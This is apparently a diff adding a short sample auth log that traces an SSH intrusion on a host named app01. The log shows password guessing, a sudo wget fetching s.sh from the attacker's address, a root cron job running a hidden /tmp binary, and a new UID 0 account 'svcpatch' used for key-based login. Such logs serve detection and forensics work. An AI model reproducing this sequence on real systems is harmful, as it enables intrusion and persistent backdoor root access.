@@ -1,0 +1,8 @@
+Mar 22 01:12:03 app01 sshd[101]: Failed password for ops from 198.51.100.23 port 55011 ssh2
+Mar 22 01:12:07 app01 sshd[101]: Failed password for ops from 198.51.100.23 port 55013 ssh2
+Mar 22 01:12:11 app01 sshd[101]: Failed password for root from 198.51.100.23 port 55015 ssh2
+Mar 22 01:12:15 app01 sshd[120]: Accepted password for ops from 198.51.100.23 port 55020 ssh2
+Mar 22 01:13:41 app01 sudo: ops : TTY=pts/0 ; COMMAND=/usr/bin/wget http://198.51.100.23:8000/s.sh
+Mar 22 01:20:02 app01 CRON[221]: (root) CMD (/tmp/.cfg/bin/run >/dev/null 2>&1)
+Mar 22 01:20:47 app01 useradd[230]: new user: name=svcpatch, UID=0, GID=0, home=/root
+Mar 22 01:22:03 app01 sshd[245]: Accepted publickey for svcpatch from 198.51.100.23 port 55044 ssh2
